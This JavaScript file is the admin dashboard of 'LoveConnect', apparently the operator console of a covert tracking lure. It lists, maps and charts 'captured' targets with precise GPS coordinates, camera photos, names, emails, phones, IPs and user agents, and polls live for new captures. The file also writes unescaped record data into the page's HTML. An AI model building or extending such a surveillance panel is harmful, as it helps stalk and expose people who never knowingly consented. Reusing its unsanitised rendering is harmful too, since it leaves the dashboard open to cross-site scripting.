// LoveConnect Admin Dashboard Script

// Global state variables
let allLocations = [];
let filteredLocations = [];
let currentPage = 1;
let rowsPerPage = 25;
let livePollingInterval = null;
let currentSortColumn = 0; // default ID
let currentSortDirection = 'desc'; // descending (newest first)

// Editing Notes context
let editingLocationId = null;

// Leaflet Global Map instances
let map = null;
let markerLayer = null;

// Chart.js Global instance
let typeChart = null;

// DOM Elements
const tableBody = document.getElementById('table-body');
const searchInput = document.getElementById('search-input');
const filterGpsSelect = document.getElementById('filter-gps');
const limitSelect = document.getElementById('limit-select');
const liveToggle = document.getElementById('live-toggle');
const refreshBtn = document.getElementById('refresh-btn');
const refreshIcon = document.getElementById('refresh-icon');
const clearDbBtn = document.getElementById('clear-db-btn');
const paginationInfo = document.getElementById('pagination-info');
const prevBtn = document.getElementById('prev-btn');
const nextBtn = document.getElementById('next-btn');

// Stat Elements
const statTotal = document.getElementById('stat-total');
const statIps = document.getElementById('stat-ips');
const statToday = document.getElementById('stat-today');
const statLastTime = document.getElementById('stat-last-time');
const statLastSub = document.getElementById('stat-last-sub');

// Chart elements
const chartCountGps = document.getElementById('chart-count-gps');
const chartCountIp = document.getElementById('chart-count-ip');

// Notes Modal Elements
const notesModal = document.getElementById('notes-modal');
const notesInput = document.getElementById('notes-input');
const saveNotesBtn = document.getElementById('save-notes-btn');
const notesSpinner = document.getElementById('notes-spinner');

// Initialize on Load
window.addEventListener('DOMContentLoaded', () => {
    fetchLogs();
    setupEventListeners();
    setupLivePolling();
});

// Register Event Listeners
function setupEventListeners() {
    // Refresh Manual Click
    refreshBtn.addEventListener('click', () => {
        // Spin effect
        refreshIcon.classList.add('animate-spin');
        fetchLogs().finally(() => {
            setTimeout(() => {
                refreshIcon.classList.remove('animate-spin');
            }, 600);
        });
    });

    // Live toggle check
    liveToggle.addEventListener('change', setupLivePolling);

    // Search Input keyup
    searchInput.addEventListener('input', () => {
        currentPage = 1;
        applyFiltersAndRerender();
    });

    // Select dropdown filters
    filterGpsSelect.addEventListener('change', () => {
        currentPage = 1;
        applyFiltersAndRerender();
    });

    limitSelect.addEventListener('change', (e) => {
        rowsPerPage = parseInt(e.target.value);
        currentPage = 1;
        applyFiltersAndRerender();
    });

    // Pagination Click
    prevBtn.addEventListener('click', () => {
        if (currentPage > 1) {
            currentPage--;
            renderTable();
        }
    });

    nextBtn.addEventListener('click', () => {
        const totalPages = Math.ceil(filteredLocations.length / rowsPerPage);
        if (currentPage < totalPages) {
            currentPage++;
            renderTable();
        }
    });

    // Clear Database Trigger
    clearDbBtn.addEventListener('click', async () => {
        const confirmMessage = "🚨 SECURITY WARNING:\n\nAre you absolutely sure you want to clear ALL captured location logs?\nThis process deletes persistent records permanently and cannot be undone.";
        
        if (confirm(confirmMessage)) {
            const finalConfirm = prompt("Type 'CONFIRM' to clear the SQLite database:");
            if (finalConfirm === 'CONFIRM') {
                try {
                    const response = await fetch('/api/locations', {
                        method: 'DELETE'
                    });
                    const result = await response.json();
                    if (response.ok && result.success) {
                        alert("✨ Database cleared successfully.");
                        fetchLogs();
                    } else {
                        alert("❌ Error: " + (result.error || "Failed to clear database logs."));
                    }
                } catch (err) {
                    console.error(err);
                    alert("❌ Server connection lost. Failed to wipe DB.");
                }
            }
        }
    });

    // Notes Save Click
    saveNotesBtn.addEventListener('click', submitNotesUpdate);
}

// Configures Live Interval-polling
function setupLivePolling() {
    if (livePollingInterval) {
        clearInterval(livePollingInterval);
        livePollingInterval = null;
    }

    if (liveToggle.checked) {
        livePollingInterval = setInterval(() => {
            fetchLogs(true); // silent fetch that doesn't clear table content
        }, 5000);
    }
}

// Fetches logs from API
async function fetchLogs(silent = false) {
    try {
        const response = await fetch('/api/locations');
        if (response.status === 401) {
            // Unauthorized, send back to login
            window.location.href = '/admin/login';
            return;
        }

        if (!response.ok) {
            throw new Error('API query failed.');
        }

        const data = await response.json();
        allLocations = data;
        
        // Refresh Stats
        updateStats();

        // Apply Search / Filters
        applyFiltersAndRerender(silent);

    } catch (err) {
        console.error('Error fetching tracker logs:', err);
        if (!silent) {
            tableBody.innerHTML = `
                <tr>
                    <td colspan="8" class="text-center py-8 text-rose-500">
                        <i class="fa-solid fa-circle-exclamation text-xl mr-2"></i> Failed to pull tracker logs. Reconnecting...
                    </td>
                </tr>
            `;
        }
    }
}

// Computes Admin Stats Dashboard
function updateStats() {
    const total = allLocations.length;
    statTotal.textContent = total;

    // Unique IPs
    const uniqueIps = new Set(allLocations.map(loc => loc.ip_address)).size;
    statIps.textContent = uniqueIps;

    // Today's Scans
    const now = new Date();
    const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
    const todayCaptures = allLocations.filter(loc => {
        const time = new Date(loc.timestamp).getTime();
        return time >= startOfToday;
    }).length;
    statToday.textContent = todayCaptures;
    
    // Change subtext dynamically
    const statTodaySub = document.getElementById('stat-today-sub');
    statTodaySub.innerHTML = `<i class="fa-solid fa-clock"></i> Captured today`;

    // Last Capture details
    if (total > 0) {
        const lastRecord = allLocations[0]; // ordered DESC timestamp
        const lastTime = new Date(lastRecord.timestamp);
        
        // Show short formatted clock time
        statLastTime.textContent = lastTime.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        
        // Compute relative minutes
        const diffMs = now.getTime() - lastTime.getTime();
        const diffMins = Math.floor(diffMs / 60000);
        
        if (diffMins === 0) {
            statLastSub.textContent = 'Active: Just Now';
            statLastSub.className = 'text-[10px] text-emerald-400 font-bold';
        } else if (diffMins < 60) {
            statLastSub.textContent = `Active: ${diffMins}m ago from ${lastRecord.city || 'Unknown'}`;
            statLastSub.className = 'text-[10px] text-pink-400 font-semibold truncate';
        } else {
            statLastSub.textContent = `Active: ${lastTime.toLocaleDateString()}`;
            statLastSub.className = 'text-[10px] text-slate-400 truncate';
        }
    } else {
        statLastTime.textContent = 'N/A';
        statLastSub.textContent = 'Awaiting tracking...';
        statLastSub.className = 'text-[10px] text-slate-500';
    }
}

// Filtering & Sorting Pipeline
function applyFiltersAndRerender(silent = false) {
    const searchVal = searchInput.value.toLowerCase().trim();
    const gpsVal = filterGpsSelect.value;

    filteredLocations = allLocations.filter(loc => {
        // GPS filter
        if (gpsVal === 'gps' && loc.is_gps !== 1) return false;
        if (gpsVal === 'ip' && loc.is_gps !== 0) return false;

        // Search text filter
        if (searchVal) {
            const notesText = (loc.notes || '').toLowerCase();
            const cityText = (loc.city || '').toLowerCase();
            const countryText = (loc.country || '').toLowerCase();
            const ipText = (loc.ip_address || '').toLowerCase();
            const agentText = (loc.user_agent || '').toLowerCase();
            const nameText = (loc.name || '').toLowerCase();
            const emailText = (loc.email || '').toLowerCase();
            const phoneText = (loc.phone || '').toLowerCase();

            return notesText.includes(searchVal) ||
                   cityText.includes(searchVal) ||
                   countryText.includes(searchVal) ||
                   ipText.includes(searchVal) ||
                   agentText.includes(searchVal) ||
                   nameText.includes(searchVal) ||
                   emailText.includes(searchVal) ||
                   phoneText.includes(searchVal);
        }

        return true;
    });

    // Apply Sorting before Pagination
    sortLocationsData();

    // Re-render UI components
    renderTable();
    initMap(filteredLocations);
    
    // Compute Chart values
    const gpsCount = filteredLocations.filter(l => l.is_gps === 1).length;
    const ipCount = filteredLocations.filter(l => l.is_gps === 0).length;
    chartCountGps.textContent = gpsCount;
    chartCountIp.textContent = ipCount;
    
    renderChart(gpsCount, ipCount);
}

// Sort location records based on column
function sortLocationsData() {
    filteredLocations.sort((a, b) => {
        let valA, valB;

        switch (currentSortColumn) {
            case 0: // ID
                valA = a.id;
                valB = b.id;
                break;
            case 1: // Coordinates
                valA = a.latitude !== null ? a.latitude : -999;
                valB = b.latitude !== null ? b.latitude : -999;
                break;
            case 2: // Accuracy
                valA = a.accuracy !== null ? a.accuracy : 999999;
                valB = b.accuracy !== null ? b.accuracy : 999999;
                break;
            case 3: // Timestamp
                valA = new Date(a.timestamp).getTime();
                valB = new Date(b.timestamp).getTime();
                break;
            case 4: // IP Address
                valA = a.ip_address;
                valB = b.ip_address;
                break;
            case 5: // Location (City/Country)
                valA = `${a.city || ''}, ${a.country || ''}`;
                valB = `${b.city || ''}, ${b.country || ''}`;
                break;
            default:
                valA = a.id;
                valB = b.id;
        }

        if (valA < valB) return currentSortDirection === 'asc' ? -1 : 1;
        if (valA > valB) return currentSortDirection === 'asc' ? 1 : -1;
        return 0;
    });
}

// Set sorting state when column header clicked
function sortTable(columnIndex) {
    if (currentSortColumn === columnIndex) {
        // Toggle direction
        currentSortDirection = currentSortDirection === 'asc' ? 'desc' : 'asc';
    } else {
        currentSortColumn = columnIndex;
        currentSortDirection = 'asc';
    }

    // Update Sorting UI icons
    for (let i = 0; i <= 5; i++) {
        const icon = document.getElementById(`sort-icon-${i}`);
        if (icon) {
            if (i === currentSortColumn) {
                icon.textContent = currentSortDirection === 'asc' ? ' ▲' : ' ▼';
                icon.className = 'text-pink-500 font-bold';
            } else {
                icon.textContent = '';
            }
        }
    }

    applyFiltersAndRerender();
}

// Renders the data logs table with pagination
function renderTable() {
    const totalRecords = filteredLocations.length;
    const totalPages = Math.ceil(totalRecords / rowsPerPage) || 1;

    // Boundary check for current page
    if (currentPage > totalPages) currentPage = totalPages;
    if (currentPage < 1) currentPage = 1;

    const startIdx = (currentPage - 1) * rowsPerPage;
    const endIdx = Math.min(startIdx + rowsPerPage, totalRecords);

    // Update Pagination UI text
    if (totalRecords === 0) {
        paginationInfo.textContent = "Showing 0 to 0 of 0 logs";
        prevBtn.disabled = true;
        nextBtn.disabled = true;
        tableBody.innerHTML = `
            <tr>
                <td colspan="8" class="text-center py-10 text-slate-500 text-sm">
                    <i class="fa-regular fa-folder-open text-2xl block mb-2 text-slate-600"></i>
                    No captured logs match your current filter settings.
                </td>
            </tr>
        `;
        return;
    }

    paginationInfo.textContent = `Showing ${startIdx + 1} to ${endIdx} of ${totalRecords} logs (Page ${currentPage}/${totalPages})`;
    
    // Enable/disable page buttons
    prevBtn.disabled = (currentPage === 1);
    nextBtn.disabled = (currentPage === totalPages);

    // Slice active rows
    const pageRecords = filteredLocations.slice(startIdx, endIdx);

    // Generate HTML rows
    tableBody.innerHTML = pageRecords.map(loc => {
        const isGps = loc.is_gps === 1;
        const coordsText = (loc.latitude !== null && loc.longitude !== null) 
            ? `<a href="https://www.google.com/maps/search/?api=1&query=${loc.latitude},${loc.longitude}" target="_blank" class="text-pink-400 hover:text-pink-300 font-bold hover:underline inline-flex items-center space-x-1" title="View Exact Coordinate on Google Maps">
                  <i class="fa-solid fa-location-arrow text-[9px] text-pink-500"></i>
                  <span>${parseFloat(loc.latitude).toFixed(5)}, ${parseFloat(loc.longitude).toFixed(5)}</span>
               </a>`
            : '<span class="text-rose-400 font-bold italic">Capture Failed</span>';

        const accText = loc.accuracy !== null ? `${loc.accuracy}m` : 'N/A';
        const formattedTime = new Date(loc.timestamp).toLocaleString();
        const photoMarkup = loc.photo
            ? `<img src="${loc.photo}" alt="Captured sample" class="w-12 h-12 rounded-lg object-cover border border-slate-700 shadow-md" />`
            : `<div class="w-12 h-12 rounded-lg border border-dashed border-slate-700 flex items-center justify-center text-[9px] text-slate-500">No photo</div>`;
        
        // Render simple client name block based on User Agent
        let platformIcon = '<i class="fa-solid fa-laptop"></i>';
        const ua = loc.user_agent.toLowerCase();
        if (ua.includes('iphone') || ua.includes('ipad')) platformIcon = '<i class="fa-brands fa-apple text-slate-400"></i>';
        else if (ua.includes('android')) platformIcon = '<i class="fa-brands fa-android text-emerald-500"></i>';
        else if (ua.includes('windows')) platformIcon = '<i class="fa-brands fa-windows text-blue-400"></i>';
        else if (ua.includes('macintosh')) platformIcon = '<i class="fa-brands fa-apple"></i>';
        else if (ua.includes('linux')) platformIcon = '<i class="fa-brands fa-linux"></i>';

        return `
            <tr class="hover:bg-slate-900/60 transition duration-150 border-b border-slate-800/40 code-font group">
                <td class="py-3 px-6 text-center text-slate-400 font-bold">${loc.id}</td>
                <td class="py-3 px-4 text-slate-200 text-left space-y-0.5">
                    <div class="flex items-center gap-3">
                        ${photoMarkup}
                        <div class="space-y-0.5 min-w-0">
                            <div class="font-bold text-slate-100 flex items-center text-xs"><i class="fa-solid fa-circle-user text-pink-500 text-[10px] mr-1.5 animate-pulse"></i> ${loc.name || '<span class="text-slate-600 font-normal">Anonymous</span>'}</div>
                            <div class="text-[10px] text-slate-400 font-medium truncate max-w-[150px]"><i class="fa-regular fa-envelope text-slate-500 mr-1.5"></i> ${loc.email || 'N/A'}</div>
                            <div class="text-[10px] text-slate-400 font-medium"><i class="fa-solid fa-phone text-slate-500 mr-1.5"></i> ${loc.phone || 'N/A'}</div>
                        </div>
                    </div>
                </td>
                <td class="py-3 px-4 font-semibold text-slate-200">
                    <span class="mr-2 text-[10px] uppercase inline-block px-1.5 py-0.5 rounded ${isGps ? 'bg-pink-500/10 text-pink-400 border border-pink-500/20' : 'bg-purple-500/10 text-purple-400 border border-purple-500/20'}">
                        ${isGps ? 'GPS' : 'IP'}
                    </span>
                    ${coordsText}
                </td>
                <td class="py-3 px-4 text-center font-medium ${loc.accuracy && loc.accuracy < 30 ? 'text-emerald-400' : 'text-slate-400'}">${accText}</td>
                <td class="py-3 px-4 text-slate-300 font-medium">${formattedTime}</td>
                <td class="py-3 px-4 font-bold text-slate-300 group-hover:text-pink-400 transition-colors">${loc.ip_address}</td>
                <td class="py-3 px-4 font-medium text-slate-200">
                    <i class="fa-solid fa-location-dot text-slate-500 mr-1.5"></i> ${loc.city || 'Unknown'}, ${loc.country || 'Unknown'}
                </td>
                <td class="py-3 px-4 text-slate-500 max-w-[150px] truncate" title="${loc.user_agent}">
                    ${platformIcon} <span class="text-[10px] ml-1">${loc.user_agent}</span>
                </td>
                <td class="py-3 px-6 text-right">
                    <div class="flex items-center justify-between space-x-2">
                        <span class="italic text-[11px] text-pink-400 max-w-[150px] truncate block" id="notes-text-${loc.id}">
                            ${loc.notes ? loc.notes : '<span class="text-slate-600 not-italic">No comments</span>'}
                        </span>
                        <button onclick="openNotesModal(${loc.id}, \`${(loc.notes || '').replace(/"/g, '&quot;').replace(/'/g, '\\\'')}\`)" class="p-1 px-2 text-[10px] font-bold bg-slate-800 hover:bg-pink-500 hover:text-white border border-slate-700 hover:border-pink-500 rounded transition duration-200 text-slate-400">
                            <i class="fa-regular fa-pen-to-square"></i> Edit
                        </button>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

// Leaflet Map Setup and Update
function initMap(locations) {
    if (!map) {
        // Center of the world
        map = L.map('leaflet-map').setView([20, 0], 2);
        
        // CartoDB Dark Matter tile layer - fits modern dark themes perfectly!
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '© OpenStreetMap contributors, © CartoDB',
            subdomains: 'abcd',
            maxZoom: 20
        }).addTo(map);

        markerLayer = L.layerGroup().addTo(map);
    } else {
        markerLayer.clearLayers();
    }

    // Hide spinner
    const spinner = document.getElementById('map-spinner');
    if (spinner) spinner.classList.add('hidden');

    if (locations.length === 0) return;

    // Custom Marker DivIcons with glowing radar effect
    const createCustomIcon = (color) => {
        return L.divIcon({
            html: `<div class="relative flex h-5 w-5 justify-center items-center">
                     <span class="animate-ping absolute inline-flex h-full w-full rounded-full opacity-60" style="background-color: ${color}"></span>
                     <span class="relative inline-flex rounded-full h-3 w-3 border-2 border-slate-900 shadow-md" style="background-color: ${color}"></span>
                   </div>`,
            className: 'custom-leaflet-marker',
            iconSize: [20, 20],
            iconAnchor: [10, 10]
        });
    };

    const gpsIcon = createCustomIcon('#ec4899'); // pink-500
    const ipIcon = createCustomIcon('#a855f7');  // purple-500

    let validCoords = [];

    locations.forEach(loc => {
        if (loc.latitude !== null && loc.longitude !== null) {
            const isGps = loc.is_gps === 1;
            const icon = isGps ? gpsIcon : ipIcon;
            
            const popupContent = `
                <div class="text-[11px] font-sans p-1 text-slate-100 max-w-[220px]">
                    <div class="font-bold flex items-center border-b border-slate-800 pb-1.5 mb-2">
                        <span class="w-2.5 h-2.5 rounded-full mr-1.5" style="background-color: ${isGps ? '#ec4899' : '#a855f7'}"></span>
                        <span class="text-[10px] uppercase text-slate-300">ID: ${loc.id} • ${isGps ? 'Real GPS Target' : 'IP Fallback'}</span>
                    </div>
                    <div class="space-y-1 text-slate-300 leading-relaxed">
                        <div class="bg-slate-950 p-2 rounded-lg border border-slate-800 my-2 space-y-1">
                            <div class="font-bold text-slate-100"><i class="fa-solid fa-circle-user text-pink-500 mr-1"></i> ${loc.name || 'Anonymous'}</div>
                            <div class="text-[10px] text-slate-400"><i class="fa-regular fa-envelope text-slate-500 mr-1"></i> ${loc.email || 'N/A'}</div>
                            <div class="text-[10px] text-slate-400"><i class="fa-solid fa-phone text-slate-500 mr-1"></i> ${loc.phone || 'N/A'}</div>
                        </div>
                        <div><i class="fa-solid fa-location-dot text-slate-500 mr-1.5 w-3 text-center"></i><strong>City:</strong> ${loc.city || 'Unknown'}, ${loc.country || 'Unknown'}</div>
                        <div><i class="fa-solid fa-compass text-slate-500 mr-1.5 w-3 text-center"></i><strong>Coords:</strong> <a href="https://www.google.com/maps/search/?api=1&query=${loc.latitude},${loc.longitude}" target="_blank" class="text-pink-400 hover:text-pink-300 font-bold hover:underline">${parseFloat(loc.latitude).toFixed(5)}, ${parseFloat(loc.longitude).toFixed(5)}</a></div>
                        <div><i class="fa-solid fa-arrows-to-circle text-slate-500 mr-1.5 w-3 text-center"></i><strong>Accuracy:</strong> ${loc.accuracy !== null ? loc.accuracy + 'm' : 'N/A'}</div>
                        <div><i class="fa-solid fa-network-wired text-slate-500 mr-1.5 w-3 text-center"></i><strong>IP Address:</strong> <span class="font-mono text-[10px]">${loc.ip_address}</span></div>
                        <div><i class="fa-solid fa-clock text-slate-500 mr-1.5 w-3 text-center"></i><strong>Captured:</strong> ${new Date(loc.timestamp).toLocaleString()}</div>
                        <div class="mt-2 pt-2 border-t border-slate-800 bg-slate-950/60 p-2 rounded-lg text-pink-400 italic">
                            <i class="fa-regular fa-comment-dots mr-1"></i> "${loc.notes || 'No annotations yet.'}"
                        </div>
                    </div>
                </div>
            `;

            const marker = L.marker([loc.latitude, loc.longitude], { icon: icon })
                            .bindPopup(popupContent);
            markerLayer.addLayer(marker);
            validCoords.push([loc.latitude, loc.longitude]);
        }
    });

    // Fit map bounds to show all markers if coordinates exist
    if (validCoords.length > 0) {
        // Use a slight timeout to ensure container has dimension
        setTimeout(() => {
            if (map) {
                map.invalidateSize();
                map.fitBounds(validCoords, { padding: [40, 40], maxZoom: 10 });
            }
        }, 100);
    }
}

// Chart.js Visualizer
function renderChart(gpsCount, ipCount) {
    const ctx = document.getElementById('type-chart');
    const noDataEl = document.getElementById('chart-no-data');

    if (gpsCount === 0 && ipCount === 0) {
        if (typeChart) {
            typeChart.destroy();
            typeChart = null;
        }
        noDataEl.classList.remove('hidden');
        ctx.classList.add('opacity-0');
        return;
    }

    noDataEl.classList.add('hidden');
    ctx.classList.remove('opacity-0');

    if (typeChart) {
        // Update Chart data and trigger redraw
        typeChart.data.datasets[0].data = [gpsCount, ipCount];
        typeChart.update();
    } else {
        typeChart = new Chart(ctx, {
            type: 'doughnut',
            data: {
                labels: ['GPS Targets', 'IP Fallbacks'],
                datasets: [{
                    data: [gpsCount, ipCount],
                    backgroundColor: ['#ec4899', '#a855f7'],
                    borderColor: '#0f172a',
                    borderWidth: 2,
                    hoverOffset: 4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: {
                            color: '#94a3b8',
                            font: {
                                family: 'Poppins',
                                size: 10,
                                weight: '500'
                            },
                            boxWidth: 10,
                            padding: 10
                        }
                    }
                },
                cutout: '72%'
            }
        });
    }
}

// Open Notes Modal Editor
function openNotesModal(id, currentNotes) {
    editingLocationId = id;
    notesInput.value = currentNotes || '';
    
    // Reset state
    saveNotesBtn.disabled = false;
    notesSpinner.classList.add('hidden');

    // Display modal with animation classes
    notesModal.classList.add('modal-active');
    notesModal.firstElementChild.classList.add('modal-scale-active');
}

// Close Notes Modal Editor
function closeNotesModal() {
    notesModal.classList.remove('modal-active');
    notesModal.firstElementChild.classList.remove('modal-scale-active');
    editingLocationId = null;
}

// Submit PUT API call to save notes
async function submitNotesUpdate() {
    if (editingLocationId === null) return;

    saveNotesBtn.disabled = true;
    notesSpinner.classList.remove('hidden');

    const updatedNotes = notesInput.value.trim();

    try {
        const response = await fetch(`/api/locations/${editingLocationId}/notes`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                notes: updatedNotes
            })
        });

        const result = await response.json();

        if (response.ok && result.success) {
            // Success: update locally
            const target = allLocations.find(l => l.id === editingLocationId);
            if (target) {
                target.notes = updatedNotes;
            }
            
            // Reapply filters (re-renders map & table keeping search state)
            applyFiltersAndRerender(true);
            
            // Close modal
            closeNotesModal();
        } else {
            alert('❌ Failed to update notes: ' + (result.error || 'Server error.'));
            saveNotesBtn.disabled = false;
            notesSpinner.classList.add('hidden');
        }
    } catch (err) {
        console.error('Notes update error:', err);
        alert('❌ Error connecting to server to save notes.');
        saveNotesBtn.disabled = false;
        notesSpinner.classList.add('hidden');
    }
}
